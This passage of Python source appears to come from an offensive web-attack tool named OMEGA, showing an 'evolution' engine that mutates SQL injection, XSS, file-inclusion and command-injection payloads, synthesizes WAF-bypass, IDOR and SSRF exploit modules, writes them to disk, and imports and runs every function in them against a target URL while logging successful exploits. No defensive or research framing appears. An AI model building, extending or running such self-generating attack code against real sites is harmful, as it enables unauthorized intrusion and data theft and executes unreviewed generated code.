            if data["uses"] > 0 and data["successes"] / data["uses"] > 0.3:
                successful.append(tech)
        
        # Identify failing techniques
        failing = []
        for tech, data in k["techniques"].items():
            if data["uses"] > 0 and data["successes"] / data["uses"] < 0.1:
                failing.append(tech)
        
        # Analyze error patterns
        error_patterns = defaultdict(int)
        for failure in k["failures"]:
            error = failure.get("error", "")
            for sig in ["timeout", "connection", "ssl", "404", "403", "500", "blocked", "waf", "rate limit"]:
                if sig in error.lower():
                    error_patterns[sig] += 1
        
        logger.debug(f"  Knowledge: {len(k['payload_library'])} payloads, {len(k['techniques'])} techniques")
        logger.debug(f"  Successful: {len(successful)}, Failing: {len(failing)}")
        if error_patterns:
            logger.debug(f"  Top errors: {dict(sorted(error_patterns.items(), key=lambda x: -x[1])[:5])}")
        
        return {"successful": successful, "failing": failing, "errors": dict(error_patterns)}
    
    def _generate_new_techniques(self):
        """Create novel techniques by mutating and combining existing ones."""
        k = self.knowledge.data
        
        # Get existing payloads
        sqli_payloads = [e["payload"] for e in k["payload_library"] if e["technique"] == "sqli"][:10]
        xss_payloads = [e["payload"] for e in k["payload_library"] if e["technique"] == "xss"][:10]
        lfi_payloads = [e["payload"] for e in k["payload_library"] if e["technique"] == "lfi"][:10]
        cmdi_payloads = [e["payload"] for e in k["payload_library"] if e["technique"] == "cmdi"][:10]
        
        # Generate novel variants
        novel_sqli = self.mutator.generate_fuzzing_payloads("sqli", 10)
        novel_xss = self.mutator.generate_fuzzing_payloads("xss", 10)
        novel_lfi = self.mutator.generate_fuzzing_payloads("lfi", 10)
        novel_cmdi = self.mutator.generate_fuzzing_payloads("cmdi", 10)
        
        # Record them as potential techniques
        for p in novel_sqli[:3]:
            self.knowledge.record_attack("sqli_novel", "synthesized", False, p[:100])
        for p in novel_xss[:3]:
            self.knowledge.record_attack("xss_novel", "synthesized", False, p[:100])
        
        logger.debug(f"  Generated {len(novel_sqli)} novel SQLi, {len(novel_xss)} novel XSS, {len(novel_lfi)} novel LFI, {len(novel_cmdi)} novel CMDI variants")
    
    def _synthesize_new_tools(self):
        """Create and integrate new tools into OMEGA."""
        tools_created = 0
        
        # Create WAF bypass tools
        bypasses = self.synthesizer.synthesize_waf_bypass()
        for name, tool_data in bypasses.items():
            if self.synthesizer.create_technique_file(name, "waf_bypass", tool_data["code"]):
                tools_created += 1
                logger.debug(f"  [NEW] Technique: {name} -- {tool_data['description'][:60]}")
        
        # Create IDOR scanner
        idor = self.synthesizer.synthesize_idor_scanner()
        for name, tool_data in idor.items():
            if self.synthesizer.create_technique_file(name, "idor", tool_data["code"]):
                tools_created += 1
                logger.debug(f"  [NEW] Technique: {name} -- {tool_data['description'][:60]}")
        
        # Create SSRF exploit
        ssrf = self.synthesizer.synthesize_ssrf_exploit()
        for name, tool_data in ssrf.items():
            if self.synthesizer.create_technique_file(name, "ssrf", tool_data["code"]):
                tools_created += 1
                logger.debug(f"  [NEW] Technique: {name} -- {tool_data['description'][:60]}")
        
        if tools_created == 0:
            logger.debug("  No new tools generated in this cycle")
    
    def _test_new_techniques(self, target_url):
        """Test newly created techniques against the target."""
        tech_dir = TECHNIQUES_DIR
        if not os.path.exists(tech_dir):
            return
        
        technique_files = [f for f in os.listdir(tech_dir) if f.endswith(".py") and not f.startswith("_")]
        
        for tf in technique_files:
            try:
                sys.path.insert(0, tech_dir)
                module_name = tf[:-3]
                if module_name in sys.modules:
                    importlib.reload(sys.modules[module_name])
                else:
                    importlib.import_module(module_name)
                
                module = sys.modules.get(module_name)
                if module:
                    funcs = [f for f in dir(module) if callable(getattr(module, f)) and not f.startswith("_")]
                    for func_name in funcs:
                        func = getattr(module, func_name)
                        try:
                            result = func(target_url)
                            self.knowledge.record_attack(f"evolved_{func_name}", target_url, True, str(result)[:100])
                            logger.debug(f"  [TEST] {func_name}: {'OK' if result else 'No result'}")
                        except Exception as e:
                            self.knowledge.record_failure(f"evolved_{func_name}", str(e), {"target": target_url})
            except Exception as e:
                pass
    
    def _log_evolution_state(self):
        """Record current evolution state."""
        self.knowledge.save()
        
        # Print stats
        stats = self.knowledge.data["stats"]
        logger.debug(f"  Total attacks: {stats['total_attacks']}")
        logger.debug(f"  Successful exploits: {stats['successful_exploits']}")
        logger.debug(f"  Tools self-created: {stats['tools_created']}")
        logger.debug(f"  Techniques discovered: {stats['techniques_discovered']}")
        logger.debug(f"  Knowledge payloads: {len(self.knowledge.data['payload_library'])}")
        logger.debug(f"  Mutation chains: {len(self.knowledge.data['mutations'])}")
    
    def _success_rate(self):
        stats = self.knowledge.data["stats"]
        if stats["total_attacks"] == 0:
            return 0.0
        return (stats["successful_exploits"] / stats["total_attacks"]) * 100
    
    def get_evolution_report(self) -> Dict:
        """Generate a comprehensive evolution report."""
        k = self.knowledge.data
        return {
            "evolution_cycles": k["stats"]["evolution_cycles"],
            "total_attacks": k["stats"]["total_attacks"],
            "successful_exploits": k["stats"]["successful_exploits"],
            "success_rate": f"{self._success_rate():.1f}%",
            "tools_self_created": k["stats"]["tools_created"],
            "techniques_discovered": k["stats"]["techniques_discovered"],
            "payloads_in_library": len(k["payload_library"]),
            "mutation_chains": len(k["mutations"]),
            "failure_count": len(k["failures"]),
            "top_techniques": {t: d["uses"] for t, d in sorted(k["techniques"].items(), key=lambda x: -x[1]["uses"])[:10]},
            "self_generated_tools": [t["name"] for t in k["self_generated_tools"]],
        }


# -- Colorama Compatibility --
try:
    from colorama import init, Fore, Style
    init()
except Exception:
    class Fore: MAGENTA=GREEN=YELLOW=RED=BLUE=CYAN=WHITE=RESET=''
    class Style: BRIGHT=DIM=NORMAL=RESET_ALL=''


# -- Main Interface ----------------------------------------------------------
def run_evolution(target_url=None, cycles=3):
    """Run the evolution engine."""
    engine = EvolutionKernel()
    return engine.evolve(target_url, cycles)

def get_evolution_status():
    """Get current evolution status and report."""
    engine = EvolutionKernel()
    return engine.get_evolution_report()

def get_knowledge():
    """Access the knowledge base directly."""
    k = EvolutionKnowledge()
    return k.data

def reset_knowledge():
    """Reset the evolution knowledge base."""
    k = EvolutionKnowledge()
    if os.path.exists(k.path):
        os.remove(k.path)
    return {"status": "Knowledge base reset"}


if __name__ == "__main__":
    # Run evolution if called directly
    import sys
    target = sys.argv[1] if len(sys.argv) > 1 else None
    cycles = int(sys.argv[2]) if len(sys.argv) > 2 else 2
    run_evolution(target, cycles)
